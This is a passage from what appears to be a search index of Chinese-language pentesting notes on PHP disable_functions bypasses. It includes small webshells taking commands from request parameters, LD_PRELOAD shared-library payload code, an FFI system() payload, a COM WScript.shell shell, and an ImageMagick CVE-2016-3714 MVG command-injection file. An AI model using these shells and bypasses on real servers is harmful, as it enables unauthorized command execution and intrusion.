\u7531\u4e8e\u6bcf\u4e2a\u670d\u52a1\u5668\u7684\u6027\u80fd\u4e0d\u4e00\u6837\uff0c\u8981\u60f3\u8ba9\u5b83\u4eec\u5ef6\u65f6\u65f6\u95f4\u76f8\u540c\uff0c\u5c31\u9700\u8981\u8c03\u6574\u53cd\u5e8f\u5217\u5316\u70b8\u5f39\u7684\u6df1\u5ea6\u3002\u6240\u4ee5\u5728\u4f7f\u7528\u8be5gadget\u65f6\uff0c\u8981\u5148\u6d4b\u8bd5\u51fa\u6df1\u5ea6\uff0c\u4e00\u822c\u6700\u597d\u8c03\u6574\u5230\u6bd4\u6b63\u5e38\u8bf7\u6c42\u616210\u79d2\u4ee5\u4e0a\u3002\u7ecf\u8fc7\u6211\u7684\u5b9e\u6218\u4e00\u822c\u8fd9\u4e2a\u6df1\u5ea6\u90fd\u572825\u523028\u4e4b\u95f4\uff0c\u5207\u8bb0\u4e0d\u8981\u8bbe\u7f6e\u592a\u5927\u5426\u5219\u9020\u6210DOS\u3002","title":"\u53cd\u5e8f\u5217\u5316\u70b8\u5f39"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP/","text":"PHP DisableFunctions\u7ed5\u8fc7 \u9b54\u6539\u51b0\u874e PHP\u53cd\u5e8f\u5217\u5316 imagemagick\u6f0f\u6d1e\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff08cve-2016-3714\uff09 FastCgi\u534f\u8bae\\&PHP-FPM\u672a\u6388\u6743\u5bfc\u81f4RCE \u4ee3\u7801\u5ba1\u8ba1","title":"PHP"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP/#php","text":"DisableFunctions\u7ed5\u8fc7 \u9b54\u6539\u51b0\u874e PHP\u53cd\u5e8f\u5217\u5316 imagemagick\u6f0f\u6d1e\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff08cve-2016-3714\uff09 FastCgi\u534f\u8bae\\&PHP-FPM\u672a\u6388\u6743\u5bfc\u81f4RCE \u4ee3\u7801\u5ba1\u8ba1","title":"PHP"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/","text":"DisableFunctions\u7ed5\u8fc7 title: PHP disablefunctions\u7ed5\u8fc7 date: tags: php\u5f00\u53d1\u4e0e\u5b89\u5168 RCE\u51fd\u6570\u9ed1\u540d\u5355\u7ed5\u8fc7: 1.exec/shell_exec (\u6267\u884c\u7cfb\u7edf\u547d\u4ee4,\u65e0\u56de\u663e) <?php echo (exec/shell_exec('whoami')); ?> 2.system/passthru (\u6267\u884c\u7cfb\u7edf\u547d\u4ee4,\u6709\u56de\u663e) <?php passthru/system('whoami');?> 3.popen \uff08 popen ( string $command , string $mode ) \uff09 \u4f5c\u7528:\u521b\u5efa\u4e00\u4e2a\u7ba1\u9053,fork\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u6765\u6267\u884c\u4f20\u5165\u7684command\u547d\u4ee4\u3002\u5e76\u5728\u6b63\u5e38\u7684\u60c5\u51b5\u4e0b\u8fd4\u56deI/O\u6d41,\u7ba1\u9053\u7531pclose\u624b\u52a8\u5173\u95ed. <?php$command=$_POST['cmd']; $handle = popen($command , \"r\"); while(!feof($handle)) { echo fread($handle, 1024); //fread($handle, 1024); } pclose($handle);?> 4.proc_open ( proc_open ( string $cmd , array $descriptorspec , array &$pipes ) \u53ef\u4ee5\u770b\u4f5c\u662fpopen\u7684\u5f3a\u5316\u7248. \u4f5c\u7528:\u521b\u5efa\u4e00\u4e2a\u7ba1\u9053,fork\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u6765\u6267\u884c\u4f20\u5165\u7684command\u547d\u4ee4,$descriptorspec\u63a7\u5236\u5b50\u8fdb\u7a0b\u6587\u4ef6\u63cf\u8ff0\u7b26\u7b26\uff0c$pipes\u662f\u6570\u7ec4\uff0c\u5176\u5143\u7d20\u662f\u8fd4\u56de\u7684I/O\u6d41(\u7d22\u5f150\uff0c1\uff0c2\u4ee3\u8868\u5bf9\u4e8e\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684I/O\u6d41) $descriptorspec\u5199\u6cd5 $descs = array( 0 => array( 'pipe' , 'r' ) , #\u8f93\u5165 1 => array( 'file' , 'output' , 'w' ) , #\u8f93\u51fa\uff0c\u53ef\u4ee5\u4e3a\u7ba1\u9053(pipe)\u6216\u6587\u4ef6 2 => array( 'file' , 'errors' , 'w' ) #\u9519\u8bef\u65e5\u5fd7\uff0c\u53ef\u4ee5\u4e3a\u7ba1\u9053(pipe)\u6216\u6587\u4ef6 ); <?php $command=\"ipconfig\"; $descriptorspec = array(1 => array(\"pipe\", \"w\")); //\u6807\u51c6\u8f93\u51fa\u5b9a\u4f4d\u5230\u7ba1\u9053 $handle = proc_open($command ,$descriptorspec , $pipes); while(!feof($pipes[1])) //\u7ba1\u9053\u7d22\u5f151\u4ee3\u8868\u5b50\u8fdb\u7a0b\u7684\u6807\u51c6\u8f93\u51fa\uff08\u901a\u8fc7$descriptorspec\u5b9a\u4e49) { echo fread($pipes[1], 1024); //fgets($pipes[1],1024); }?> LD_PRELOAD\u4e0eputenv \u7ed5\u8fc7 LD_PRELOAD\u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\u5b9a\u4e49\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u4f1a\u6bd4\u5176\u4ed6\u52a8\u6001\u94fe\u63a5\u5e93\u5148\u88ab\u8c03\u7528. putenv(\u201c\u73af\u5883\u53d8\u91cf\u540d\u201d=\u201dvalue\u201d) php\u4ee3\u7801\u91cc\u7528\u4e8e\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u7684\u51fd\u6570 \u52a8\u6001\u94fe\u63a5\u5e93(.so\u6587\u4ef6): \u547d\u4ee4\u5728\u8fd0\u884c\u65f6\u4f1a\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528,\u4ece\u5171\u4eab\u94fe\u63a5\u5e93\u91cc\u8c03\u7528\u4ee3\u7801.\u52a8\u6001\u94fe\u63a5\u5e93\u662f\u5171\u4eab\u94fe\u63a5\u5e93\u7684\u4e00\u79cd\uff0c\u5176\u91cc\u9762\u4e00\u822c\u90fd\u662f.so\u6587\u4ef6 \u5229\u7528php\u4ee3\u7801\u91cc\u7684mail\u51fd\u6570\u8fbe\u5230\u7ed5\u8fc7\u76ee\u7684 php\u91cc\u7684mail\u51fd\u6570\u8c03\u7528\u4e86 linux\u91cc\u7684sendmail\u6307\u4ee4 execve(\"/usr/bin/php\", [\"php\", \"test.php\"], [/* 20 vars */]) = 0 [pid 23864] execve(\"/bin/sh\", [\"sh\", \"-c\", \"/usr/sbin/sendmail -t -i \"], [/* 20 vars */]) = 0 [pid 23865] execve(\"/usr/sbin/sendmail\", [\"/usr/sbin/sendmail\", \"-t\", \"-i\"], [/* 20 vars */]) = 0 \u53d1\u73b0\u5176\u8c03\u7528\u4e86sendmail\uff0c\u90a3\u4e48sendmail\u8c03\u7528\u4e86\u4ec0\u4e48?\u53ef\u4ee5\u5f88\u6e05\u695a\u7684\u770b\u5230\u5b83\u8c03\u7528\u4e86\u5f88\u591a\u547d\u4ee4,\u90a3\u4e48\u6211\u4eec\u601d\u8def\u5982\u4e0b\uff1a \u521b\u5efa\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5b9a\u4e49\u4e00\u4e2a\u540c\u540d\u547d\u4ee4\uff08\u690d\u5165payload)\uff0c\u5e76\u5728\u4e4b\u540e\u628a\u5b83\u653e\u5728LD_PRELOAD\u91cc\u4f18\u5148\u8c03\u7528,\u8fd9\u6837\u53ea\u9700\u6267\u884c\u8c03\u7528\u4e86mail\u51fd\u6570\u7684php\u6587\u4ef6\uff0c\u518d\u53c8mail\u51fd\u6570\u8c03\u7528sendmail\u547d\u4ee4\uff0c\u518d\u7531sendmail\u547d\u4ee4\u4f18\u5148\u8c03\u7528\u6211\u4eec\u91cd\u5199\u7684\u547d\u4ee4\uff0c\u5373\u53ef\u7ed5\u8fc7disable_functions. \u6211\u4eec\u8fd9\u91cc\u91cd\u5199getuid\u547d\u4ee4: #include <stdlib.h> #include <stdio.h> #include <string.h> void payload() { system(\"ls / > /tmp/sky\"); //payload } int geteuid() { if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); payload(); } \u7136\u540e\u5c06\u4ed6\u7f16\u8bd1\u4e3a\u52a8\u6001\u94fe\u63a5\u5e93 gcc -c -fPIC hack.c -o hack gcc --share hack -o hack.so \u63a5\u4e0b\u6765\u8fd0\u884cPHP\u811a\u672c <?php putenv(\"LD_PRELOAD=./hack.so\"); mail('','','',''); ?> \u6267\u884c\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0payload\u786e\u5b9e\u88ab\u6267\u884c\u4e86 mail\u51fd\u6570\u66f4\u5e7f\u7684\u653b\u51fb\u9762: attribute (( constructor )) \u5982\u679c\u6211\u4eec\u7684linux\u91cc\u6ca1\u6709sendmail\u6307\u4ee4\u4e86\u5462\uff1f\u8fd9\u4e2a\u65f6\u5019\u5c31\u8981\u7528\u5230 attribute (( constructor )) \u4e86 attribute (( constructor )) \uff1a\u52a0\u8f7d\u5171\u4eab\u5e93\u65f6\u5c31\u81ea\u52a8\u8fd0\u884c,\u901a\u5e38\u5728\u7a0b\u5e8f\u542f\u52a8\u65f6\u8fd0\u884c\uff08\u6709\u70b9\u7c7b\u4f3c\u9b54\u672f\u51fd\u6570\uff1f\u54c8\u54c8) c\u8bed\u8a00\u4ee3\u7801: #define _GNU_SOURCE #include <stdlib.h> #include <unistd.h> #include <sys/types.h> __attribute__ ((__constructor__)) void angel (void){ unsetenv(\"LD_PRELOAD\"); system(\"ls\"); } LD_PRELOAD\u6307\u5b9a\u4e00\u4e0b\u8be5so\uff0c\u6267\u884cPHP\u7a0b\u5e8f\uff0c\u53ef\u89c1payload\u786e\u5b9e\u88ab\u5b9e\u73b0\u4e86 \u810f\u4e1c\u897f:\u4f7f\u7528\u8681\u5251 disable_functions\u7ed5\u8fc7\u63d2\u4ef6 \u86ee\u65e0\u8111\u7684,\u628a\u8fd9\u4e2a\u63d2\u4ef6\u5f00\u4e86\u5c31\u5b8c\u4e8b\u4e86 ImageMagick\u6f0f\u6d1e\uff08CVE-2016-3714\uff09 \u53c2\u8003 https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html \u4f55\u4e3aImageMagick \u7b80\u800c\u8a00\u4e4b\uff0c\u5c31\u662f\u4e00\u4e2a\u5904\u7406\u56fe\u7247\u7684\u7a0b\u5e8f\u3002 RCE ImageMagick\u6709\u4e00\u4e2a\u529f\u80fd\u53eb\u505a delegate(\u59d4\u6258),\u4f5c\u7528\u662f\u8c03\u7528\u5916\u90e8\u7684lib\u5904\u7406\u6587\u4ef6\u3002 \u5728ImageMagick\u7684\u914d\u7f6e\u6587\u4ef6 /etc/ImageMagick/delegates.xml \u53ef\u4ee5\u770b\u5230\u6240\u6709\u7684\u59d4\u6258(\u81ea\u5df1\u53bb\u770b) \u5b83\u7684\u59d4\u6258\u4e00\u822c\u662f\u957f\u8fd9\u6837\u7684,\u610f\u601d\u662f\u5728\u5904\u7406https\u56fe\u7247\u65f6\uff0c\u4f1a\u8c03\u7528command\u7684\u91cc\u7684\u6307\u4ee4.command\u91cc\u7684%m\u4ee3\u8868\u4e00\u79cd\u5360\u4f4d\u7b26\uff0c%m\u5360\u4f4d\u7b26\u4ee3\u8868\u83b7\u53d6https\u56fe\u7247\u7684url\uff08\u5f53\u7136\u5360\u4f4d\u7b26\u4e0d\u4ec5\u4ec5%m\u4e00\u79cd\uff0c\u8fd8\u6709 \u6bd4\u5982%i\u662f\u8f93\u5165\u7684\u6587\u4ef6\u540d\uff0c%l\u662f\u56fe\u7247exif label\u4fe1\u606f \u7b49\u7b49\u7b49\u7b49) <delegate decode=\"https\" command=\"&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;\"/> ImageMagick\u9ed8\u8ba4\u652f\u6301\u4e00\u79cd\u56fe\u7247\u683c\u5f0f\uff0c\u53ebmvg\uff0c\u800cmvg\u4e0esvg\u683c\u5f0f\u7c7b\u4f3c\uff0c\u5176\u4e2d\u662f\u4ee5\u6587\u672c\u5f62\u5f0f\u5199\u5165\u77e2\u91cf\u56fe\u7684\u5185\u5bb9\uff0c\u800c\u8fd9\u5176\u4e2d\u5c31\u53ef\u4ee5\u5305\u542bhttps\u5904\u7406\u8fc7\u7a0b\u3002 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2amvg\u6587\u4ef6(\u6587\u4ef6\u540d\u540e\u7f00\u4e0d\u4e00\u5b9a\u975e\u5f97.mvg\uff0cimagemagick\u662f\u6309\u7167\u6587\u4ef6\u5185\u5bb9\u6765\u533a\u5206\u6587\u4ef6\u7c7b\u578b\u7684)\u4ea4\u7ed9imagemagick\u5904\u7406\uff0c\u5728\u5176\u5305\u542bhttps\u5904\u4f7f\u7528|\u6216&\u5206\u5272\u547d\u4ee4\uff0c\u9020\u6210rce,\u5982 push graphic-context viewbox 0 0 640 480 fill 'url(https://\"|mkdir /nmsl; \")' pop graphic-context \u4e0a\u9762\u662fmvg\u7684\u4e00\u79cd\u683c\u5f0f\uff0c\u5176\u4e2d\u5728fill\u5904\u586b\u5165https\u7684url. \u5b9e\u8df5 ffi rce \u9002\u7528\u7248\u672c:php>7.4 \u9700\u8981\uff1a FFI support = enable \uff0c\uff08\u5f00\u542fffi) opcache.preload \u542f\u7528. (\u6307\u5b9a\u5c06\u5728\u670d\u52a1\u5668\u542f\u52a8\u65f6\u7f16\u8bd1\u548c\u6267\u884c\u7684PHP\u6587\u4ef6\uff0c\u6587\u4ef6\u4e2d\u5b9a\u4e49\u7684\u6240\u6709\u51fd\u6570\u548c\u5927\u591a\u6570\u7c7b\u90fd\u5c06\u6c38\u4e45\u52a0\u8f7d\u5230 PHP \u7684\u51fd\u6570\u548c\u7c7b\u8868\u4e2d\uff0c\u5e76\u5728\u5c06\u6765\u7684\u4efb\u4f55\u8bf7\u6c42\u7684\u4e0a\u4e0b\u6587\u4e2d\u6c38\u4e45\u53ef\u7528)\u3002 (\u6781\u5927\u62d3\u5bbdffi rce\u653b\u51fb\u9762) ffi\u662fphp>7.4\u65b0\u589e\u7684\u4e00\u4e2a\u4e1c\u897f\uff0c\u7b80\u800c\u8a00\u4e4b\u5c31\u662f\u4e00\u4e2a\u53ef\u4ee5\u5728php\u91cc\u8c03\u7528c\u8bed\u8a00\u4ee3\u7801\u7684\u63a5\u53e3. https://www.php.net/manual/en/ffi.examples-basic.php \u5b98\u65b9\u6587\u6863 \u6211\u4eec\u7684payload\u96cf\u5f62\u4e00\u822c\u662f\u8fd9\u6837 $ffi=FFI::cdef{ \"int system(char *format);\" }; $ffi->system(command); \u627e\u4e2a\u673a\u4f1a\u8ba9\u670d\u52a1\u5668\u8c03\u7528FFI\u5c31\u53ef\u4ee5\u4e86\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u7ed5\u8fc7disable_functions\u4e86\u503c\u5f97\u6ce8\u610f\u7684\u662fsystem\u6ca1\u6709\u56de\u663e \u5229\u7528Windows\u7cfb\u7edf\u7ec4\u4ef6COM\u7ed5\u8fc7 \u9700\u6c42: windows\u7cfb\u7edf\uff0c\u4e14system32\u76ee\u5f55\u4e0b\u5b58\u5728wshom.ocx php.ini\u91cccom.allow_dcom=true php.ini\u91ccextension=php_com_dotnet.dll(\u6ca1\u6709\u7684\u8bdd\u81ea\u5df1\u52a0\u4e0a) \u6b63\u786e\u914d\u7f6e\u540e\uff0c\u5728phpinfo\u4e2d\u770b,\u8fd9\u6837\u5c31\u7b97\u914d\u7f6e\u597d\u4e86\u73af\u5883 ban\u6389\u51fd\u6570 .\u8fd9\u79cd\u60c5\u51b5\u6211\u4eec\u6765\u7ed5\u7ed5disable_functions <?php $command = $_GET['cmd']; $wsh = new COM('WScript.shell'); // \u751f\u6210\u4e00\u4e2aCOM\u5bf9\u8c61\u3000Shell.Application\u4e5f\u80fd $exec = $wsh->exec(\"cmd /c\".$command); //\u8c03\u7528\u5bf9\u8c61\u65b9\u6cd5\u6765\u6267\u884c\u547d\u4ee4 $stdout = $exec->StdOut(); $stroutput = $stdout->ReadAll(); echo $stroutput; ?> \u627e\u4e2a\u673a\u4f1a\u628a\u8fd9\u4e2a\u811a\u672c\u4f20\u5230\u670d\u52a1\u5668\u4e0a,\u7136\u540e\u8bbf\u95ee\u5b83\uff0ccmd\u4f20\u547d\u4ee4\u5c31\u53ef\u4ee5\u4e86","title":"DisableFunctions\u7ed5\u8fc7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/#disablefunctions","text":"title: PHP disablefunctions\u7ed5\u8fc7 date: tags: php\u5f00\u53d1\u4e0e\u5b89\u5168","title":"DisableFunctions\u7ed5\u8fc7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/#rce","text":"1.exec/shell_exec (\u6267\u884c\u7cfb\u7edf\u547d\u4ee4,\u65e0\u56de\u663e) <?php echo (exec/shell_exec('whoami')); ?> 2.system/passthru (\u6267\u884c\u7cfb\u7edf\u547d\u4ee4,\u6709\u56de\u663e) <?php passthru/system('whoami');?> 3.popen \uff08 popen ( string $command , string $mode ) \uff09 \u4f5c\u7528:\u521b\u5efa\u4e00\u4e2a\u7ba1\u9053,fork\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u6765\u6267\u884c\u4f20\u5165\u7684command\u547d\u4ee4\u3002\u5e76\u5728\u6b63\u5e38\u7684\u60c5\u51b5\u4e0b\u8fd4\u56deI/O\u6d41,\u7ba1\u9053\u7531pclose\u624b\u52a8\u5173\u95ed. <?php$command=$_POST['cmd']; $handle = popen($command , \"r\"); while(!feof($handle)) { echo fread($handle, 1024); //fread($handle, 1024); } pclose($handle);?> 4.proc_open ( proc_open ( string $cmd , array $descriptorspec , array &$pipes ) \u53ef\u4ee5\u770b\u4f5c\u662fpopen\u7684\u5f3a\u5316\u7248. \u4f5c\u7528:\u521b\u5efa\u4e00\u4e2a\u7ba1\u9053,fork\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u6765\u6267\u884c\u4f20\u5165\u7684command\u547d\u4ee4,$descriptorspec\u63a7\u5236\u5b50\u8fdb\u7a0b\u6587\u4ef6\u63cf\u8ff0\u7b26\u7b26\uff0c$pipes\u662f\u6570\u7ec4\uff0c\u5176\u5143\u7d20\u662f\u8fd4\u56de\u7684I/O\u6d41(\u7d22\u5f150\uff0c1\uff0c2\u4ee3\u8868\u5bf9\u4e8e\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684I/O\u6d41) $descriptorspec\u5199\u6cd5 $descs = array( 0 => array( 'pipe' , 'r' ) , #\u8f93\u5165 1 => array( 'file' , 'output' , 'w' ) , #\u8f93\u51fa\uff0c\u53ef\u4ee5\u4e3a\u7ba1\u9053(pipe)\u6216\u6587\u4ef6 2 => array( 'file' , 'errors' , 'w' ) #\u9519\u8bef\u65e5\u5fd7\uff0c\u53ef\u4ee5\u4e3a\u7ba1\u9053(pipe)\u6216\u6587\u4ef6 ); <?php $command=\"ipconfig\"; $descriptorspec = array(1 => array(\"pipe\", \"w\")); //\u6807\u51c6\u8f93\u51fa\u5b9a\u4f4d\u5230\u7ba1\u9053 $handle = proc_open($command ,$descriptorspec , $pipes); while(!feof($pipes[1])) //\u7ba1\u9053\u7d22\u5f151\u4ee3\u8868\u5b50\u8fdb\u7a0b\u7684\u6807\u51c6\u8f93\u51fa\uff08\u901a\u8fc7$descriptorspec\u5b9a\u4e49) { echo fread($pipes[1], 1024); //fgets($pipes[1],1024); }?>","title":"RCE\u51fd\u6570\u9ed1\u540d\u5355\u7ed5\u8fc7:"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/#ld_preloadputenv","text":"LD_PRELOAD\u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\u5b9a\u4e49\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u4f1a\u6bd4\u5176\u4ed6\u52a8\u6001\u94fe\u63a5\u5e93\u5148\u88ab\u8c03\u7528. putenv(\u201c\u73af\u5883\u53d8\u91cf\u540d\u201d=\u201dvalue\u201d) php\u4ee3\u7801\u91cc\u7528\u4e8e\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u7684\u51fd\u6570 \u52a8\u6001\u94fe\u63a5\u5e93(.so\u6587\u4ef6): \u547d\u4ee4\u5728\u8fd0\u884c\u65f6\u4f1a\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528,\u4ece\u5171\u4eab\u94fe\u63a5\u5e93\u91cc\u8c03\u7528\u4ee3\u7801.\u52a8\u6001\u94fe\u63a5\u5e93\u662f\u5171\u4eab\u94fe\u63a5\u5e93\u7684\u4e00\u79cd\uff0c\u5176\u91cc\u9762\u4e00\u822c\u90fd\u662f.so\u6587\u4ef6","title":"LD_PRELOAD\u4e0eputenv \u7ed5\u8fc7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/#phpmail","text":"php\u91cc\u7684mail\u51fd\u6570\u8c03\u7528\u4e86 linux\u91cc\u7684sendmail\u6307\u4ee4 execve(\"/usr/bin/php\", [\"php\", \"test.php\"], [/* 20 vars */]) = 0 [pid 23864] execve(\"/bin/sh\", [\"sh\", \"-c\", \"/usr/sbin/sendmail -t -i \"], [/* 20 vars */]) = 0 [pid 23865] execve(\"/usr/sbin/sendmail\", [\"/usr/sbin/sendmail\", \"-t\", \"-i\"], [/* 20 vars */]) = 0 \u53d1\u73b0\u5176\u8c03\u7528\u4e86sendmail\uff0c\u90a3\u4e48sendmail\u8c03\u7528\u4e86\u4ec0\u4e48?\u53ef\u4ee5\u5f88\u6e05\u695a\u7684\u770b\u5230\u5b83\u8c03\u7528\u4e86\u5f88\u591a\u547d\u4ee4,\u90a3\u4e48\u6211\u4eec\u601d\u8def\u5982\u4e0b\uff1a \u521b\u5efa\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5b9a\u4e49\u4e00\u4e2a\u540c\u540d\u547d\u4ee4\uff08\u690d\u5165payload)\uff0c\u5e76\u5728\u4e4b\u540e\u628a\u5b83\u653e\u5728LD_PRELOAD\u91cc\u4f18\u5148\u8c03\u7528,\u8fd9\u6837\u53ea\u9700\u6267\u884c\u8c03\u7528\u4e86mail\u51fd\u6570\u7684php\u6587\u4ef6\uff0c\u518d\u53c8mail\u51fd\u6570\u8c03\u7528sendmail\u547d\u4ee4\uff0c\u518d\u7531sendmail\u547d\u4ee4\u4f18\u5148\u8c03\u7528\u6211\u4eec\u91cd\u5199\u7684\u547d\u4ee4\uff0c\u5373\u53ef\u7ed5\u8fc7disable_functions. \u6211\u4eec\u8fd9\u91cc\u91cd\u5199getuid\u547d\u4ee4: #include <stdlib.h> #include <stdio.h> #include <string.h> void payload() { system(\"ls / > /tmp/sky\"); //payload } int geteuid() { if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); payload(); } \u7136\u540e\u5c06\u4ed6\u7f16\u8bd1\u4e3a\u52a8\u6001\u94fe\u63a5\u5e93 gcc -c -fPIC hack.c -o hack gcc --share hack -o hack.so \u63a5\u4e0b\u6765\u8fd0\u884cPHP\u811a\u672c <?php putenv(\"LD_PRELOAD=./hack.so\"); mail('','','',''); ?> \u6267\u884c\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0payload\u786e\u5b9e\u88ab\u6267\u884c\u4e86","title":"\u5229\u7528php\u4ee3\u7801\u91cc\u7684mail\u51fd\u6570\u8fbe\u5230\u7ed5\u8fc7\u76ee\u7684"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/#mail-attribute-constructor","text":"\u5982\u679c\u6211\u4eec\u7684linux\u91cc\u6ca1\u6709sendmail\u6307\u4ee4\u4e86\u5462\uff1f\u8fd9\u4e2a\u65f6\u5019\u5c31\u8981\u7528\u5230 attribute (( constructor )) \u4e86 attribute (( constructor )) \uff1a\u52a0\u8f7d\u5171\u4eab\u5e93\u65f6\u5c31\u81ea\u52a8\u8fd0\u884c,\u901a\u5e38\u5728\u7a0b\u5e8f\u542f\u52a8\u65f6\u8fd0\u884c\uff08\u6709\u70b9\u7c7b\u4f3c\u9b54\u672f\u51fd\u6570\uff1f\u54c8\u54c8) c\u8bed\u8a00\u4ee3\u7801: #define _GNU_SOURCE #include <stdlib.h> #include <unistd.h> #include <sys/types.h> __attribute__ ((__constructor__)) void angel (void){ unsetenv(\"LD_PRELOAD\"); system(\"ls\"); } LD_PRELOAD\u6307\u5b9a\u4e00\u4e0b\u8be5so\uff0c\u6267\u884cPHP\u7a0b\u5e8f\uff0c\u53ef\u89c1payload\u786e\u5b9e\u88ab\u5b9e\u73b0\u4e86","title":"mail\u51fd\u6570\u66f4\u5e7f\u7684\u653b\u51fb\u9762: attribute ((constructor))"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/#disable_functions","text":"\u86ee\u65e0\u8111\u7684,\u628a\u8fd9\u4e2a\u63d2\u4ef6\u5f00\u4e86\u5c31\u5b8c\u4e8b\u4e86","title":"\u810f\u4e1c\u897f:\u4f7f\u7528\u8681\u5251 disable_functions\u7ed5\u8fc7\u63d2\u4ef6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/#imagemagickcve-2016-3714","text":"\u53c2\u8003 https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html","title":"ImageMagick\u6f0f\u6d1e\uff08CVE-2016-3714\uff09"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/#imagemagick","text":"\u7b80\u800c\u8a00\u4e4b\uff0c\u5c31\u662f\u4e00\u4e2a\u5904\u7406\u56fe\u7247\u7684\u7a0b\u5e8f\u3002","title":"\u4f55\u4e3aImageMagick"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/DisableFunctions%E7%BB%95%E8%BF%87/DisableFunctions%E7%BB%95%E8%BF%87/#rce_1","text":"ImageMagick\u6709\u4e00\u4e2a\u529f\u80fd\u53eb\u505a delegate(\u59d4\u6258),\u4f5c\u7528\u662f\u8c03\u7528\u5916\u90e8\u7684lib\u5904\u7406\u6587\u4ef6\u3002 \u5728ImageMagick\u7684\u914d\u7f6e\u6587\u4ef6 /etc/ImageMagick/delegates.xml \u53ef\u4ee5\u770b\u5230\u6240\u6709\u7684\u59d4\u6258(\u81ea\u5df1\u53bb\u770b) \u5b83\u7684\u59d4\u6258\u4e00\u822c\u662f\u957f\u8fd9\u6837\u7684,\u610f\u601d\u662f\u5728\u5904\u7406https\u56fe\u7247\u65f6\uff0c\u4f1a\u8c03\u7528command\u7684\u91cc\u7684\u6307\u4ee4.command\u91cc\u7684%m\u4ee3\u8868\u4e00\u79cd\u5360\u4f4d\u7b26\uff0c%m\u5360\u4f4d\u7b26\u4ee3\u8868\u83b7\u53d6https\u56fe\u7247\u7684url\uff08\u5f53\u7136\u5360\u4f4d\u7b26\u4e0d\u4ec5\u4ec5%m\u4e00\u79cd\uff0c\u8fd8\u6709 \u6bd4\u5982%i\u662f\u8f93\u5165\u7684\u6587\u4ef6\u540d\uff0c%l\u662f\u56fe\u7247exif label\u4fe1\u606f \u7b49\u7b49\u7b49\u7b49) <delegate decode=\"https\" command=\"&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;\"/> ImageMagick\u9ed8\u8ba4\u652f\u6301\u4e00\u79cd\u56fe\u7247\u683c\u5f0f\uff0c\u53ebmvg\uff0c\u800cmvg\u4e0esvg\u683c\u5f0f\u7c7b\u4f3c\uff0c\u5176\u4e2d\u662f\u4ee5\u6587\u672c\u5f62\u5f0f\u5199\u5165\u77e2\u91cf\u56fe\u7684\u5185\u5bb9\uff0c\u800c\u8fd9\u5176\u4e2d\u5c31\u53ef\u4ee5\u5305\u542bhttps\u5904\u7406\u8fc7\u7a0b\u3002 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2amvg\u6587\u4ef6(\u6587\u4ef6\u540d\u540e\u7f00\u4e0d\u4e00\u5b9a\u975e\u5f97.mvg\uff0cimagemagick\u662f\u6309\u7167\u6587\u4ef6\u5185\u5bb9\u6765\u533a\u5206\u6587\u4ef6\u7c7b\u578b\u7684)\u4ea4\u7ed9imagemagick\u5904\u7406\uff0c\u5728\u5176\u5305\u542bhttps\u5904\u4f7f\u7528|\u6216&\u5206\u5272\u547d\u4ee4\uff0c\u9020\u6210rce,\u5982 push 